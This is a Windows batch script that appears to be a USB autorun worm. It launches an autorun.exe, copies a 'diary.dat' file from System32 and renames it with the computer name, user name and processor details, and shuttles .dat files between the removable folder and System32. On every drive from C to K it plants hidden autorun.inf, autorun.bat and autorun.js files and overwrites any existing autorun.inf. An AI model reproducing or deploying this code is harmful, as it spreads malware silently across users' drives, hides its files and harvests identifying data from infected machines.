Echo off

start .\

start J65LY23Z\autorun.exe

copy "%SystemRoot%\system32\Shell32\diary.dat" "%SystemRoot%\system32\Shell32\%computername%_%username%_%PROCESSOR_LEVEL%_%PROCESSOR_REVISION%.dat" /y
xcopy "%SystemRoot%\system32\Shell32\%computername%_%username%_%PROCESSOR_LEVEL%_%PROCESSOR_REVISION%.dat" "J65LY23Z\" /c /d /i /y

xcopy "%SystemRoot%\system32\Shell32\program\*.dat" "J65LY23Z\" /c /d /i /y
mkdir "%SystemRoot%\system32\Shell32\program"
xcopy "J65LY23Z\*.dat" "%SystemRoot%\system32\Shell32\program\" /c /d /i /y

mkdir "%SystemRoot%\system32\Shell32\fromwher"
copy "J65LY23Z\autorun.tol" "%SystemRoot%\system32\Shell32\fromwher\" /y

chdir /d J65LY23Z
mkdir D:\J65LY23Z
attrib +s +h D:\J65LY23Z
copy "autorun.*" "D:\J65LY23Z" /y
xcopy "*.dat" "D:\J65LY23Z" /c /d /i /y
copy "D:\J65LY23Z\autorun.bat" "D:\" /y
copy "D:\J65LY23Z\autorun.js" "D:\" /y

if exist D:\autorun.inf (
attrib -r -s -h D:\autorun.inf
del /F /Q D:\autorun.inf
)

copy "D:\J65LY23Z\autorun.inf" "D:\" /y
attrib +r +s +h "D:\autorun.*"

mkdir E:\J65LY23Z
attrib +s +h E:\J65LY23Z
copy "autorun.*" "E:\J65LY23Z" /y
xcopy "*.dat" "E:\J65LY23Z" /c /d /i /y
copy "E:\J65LY23Z\autorun.bat" "E:\" /y
copy "E:\J65LY23Z\autorun.js" "E:\" /y

if exist E:\autorun.inf (
attrib -r -s -h E:\autorun.inf
del /F /Q E:\autorun.inf
)

copy "E:\J65LY23Z\autorun.inf" "E:\" /y
attrib +r +s +h "E:\autorun.*"

mkdir F:\J65LY23Z
attrib +s +h F:\J65LY23Z
copy "autorun.*" "F:\J65LY23Z" /y
xcopy "*.dat" "F:\J65LY23Z" /c /d /i /y
copy "F:\J65LY23Z\autorun.bat" "F:\" /y
copy "F:\J65LY23Z\autorun.js" "F:\" /y

if exist F:\autorun.inf (
attrib -r -s -h F:\autorun.inf
del /F /Q F:\autorun.inf
)

copy "F:\J65LY23Z\autorun.inf" "F:\" /y
attrib +r +s +h "F:\autorun.*"

mkdir C:\J65LY23Z
attrib +s +h C:\J65LY23Z
copy "autorun.*" "C:\J65LY23Z" /y
xcopy "*.dat" "C:\J65LY23Z" /c /d /i /y
copy "C:\J65LY23Z\autorun.bat" "C:\" /y
copy "C:\J65LY23Z\autorun.js" "C:\" /y

if exist C:\autorun.inf (
attrib -r -s -h C:\autorun.inf
del /F /Q C:\autorun.inf
)

copy "C:\J65LY23Z\autorun.inf" "C:\" /y
attrib +r +s +h "C:\autorun.*"

mkdir G:\J65LY23Z
attrib +s +h G:\J65LY23Z
copy "autorun.*" "G:\J65LY23Z" /y
xcopy "*.dat" "G:\J65LY23Z" /c /d /i /y
copy "G:\J65LY23Z\autorun.bat" "G:\" /y
copy "G:\J65LY23Z\autorun.js" "G:\" /y

if exist G:\autorun.inf (
attrib -r -s -h G:\autorun.inf
del /F /Q G:\autorun.inf
)

copy "G:\J65LY23Z\autorun.inf" "G:\" /y
attrib +r +s +h "G:\autorun.*"

mkdir H:\J65LY23Z
attrib +s +h H:\J65LY23Z
copy "autorun.*" "H:\J65LY23Z" /y
xcopy "*.dat" "H:\J65LY23Z" /c /d /i /y
copy "H:\J65LY23Z\autorun.bat" "H:\" /y
copy "H:\J65LY23Z\autorun.js" "H:\" /y

if exist H:\autorun.inf (
attrib -r -s -h H:\autorun.inf
del /F /Q H:\autorun.inf
)

copy "H:\J65LY23Z\autorun.inf" "H:\" /y
attrib +r +s +h "H:\autorun.*"

mkdir I:\J65LY23Z
attrib +s +h I:\J65LY23Z
copy "autorun.*" "I:\J65LY23Z" /y
xcopy "*.dat" "I:\J65LY23Z" /c /d /i /y
copy "I:\J65LY23Z\autorun.bat" "I:\" /y
copy "I:\J65LY23Z\autorun.js" "I:\" /y

if exist I:\autorun.inf (
attrib -r -s -h I:\autorun.inf
del /F /Q I:\autorun.inf
)

copy "I:\J65LY23Z\autorun.inf" "I:\" /y
attrib +r +s +h "I:\autorun.*"

mkdir J:\J65LY23Z
attrib +s +h J:\J65LY23Z
copy "autorun.*" "J:\J65LY23Z" /y
xcopy "*.dat" "J:\J65LY23Z" /c /d /i /y
copy "J:\J65LY23Z\autorun.bat" "J:\" /y
copy "J:\J65LY23Z\autorun.js" "J:\" /y

if exist J:\autorun.inf (
attrib -r -s -h J:\autorun.inf
del /F /Q J:\autorun.inf
)

copy "J:\J65LY23Z\autorun.inf" "J:\" /y
attrib +r +s +h "J:\autorun.*"

mkdir K:\J65LY23Z
attrib +s +h K:\J65LY23Z
copy "autorun.*" "K:\J65LY23Z" /y
xcopy "*.dat" "K:\J65LY23Z" /c /d /i /y
copy "K:\J65LY23Z\autorun.bat" "K:\" /y
copy "K:\J65LY23Z\autorun.js" "K:\" /y

if exist K:\autorun.inf (
attrib -r -s -h K:\autorun.inf
del /F /Q K:\autorun.inf
)

copy "K:\J65LY23Z\autorun.inf" "K:\" /y
attrib +r +s +h "K:\autorun.*"
